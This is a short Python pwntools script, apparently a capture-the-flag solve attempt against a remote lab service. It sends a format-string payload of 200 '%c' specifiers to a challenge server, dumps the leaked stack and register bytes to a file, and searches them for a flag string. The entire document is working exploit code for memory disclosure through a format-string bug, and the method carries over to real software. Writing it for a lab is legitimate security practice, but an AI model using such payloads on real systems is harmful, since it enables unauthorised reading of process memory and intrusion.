#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

r = remote("pwn-zoroblindpath.hackena-labs.com", 443, ssl=True)

r.recvuntil(b"Clue: ")
leak = r.recvline().strip()
log.info(f"Leaked: {leak}")

r.recvuntil(b"Write your path:")

# Try to get as much data as possible with %c (which works)
# Each %c will print one byte from the argument registers/stack
# Let's maximize our dump
payload = b"%c" * 200  # Less than 0x108 bytes
r.sendline(payload)

# Wait and collect all output
import time
time.sleep(1.5)
response = r.recvall(timeout=2)

log.info(f"Response length: {len(response)}")

# Save for analysis
with open('full_dump.bin', 'wb') as f:
    f.write(response)

# Search for flag
import re
patterns = [rb'0xL4ugh\{[^}]+\}', rb'flag\{[^}]+\}']
for pat in patterns:
    if re.search(pat, response, re.IGNORECASE):
        match = re.search(pat, response, re.IGNORECASE)
        log.success(f"FOUND FLAG: {match.group()}")
        break
else:
    # Print hex dump
    print(hexdump(response))

r.close()
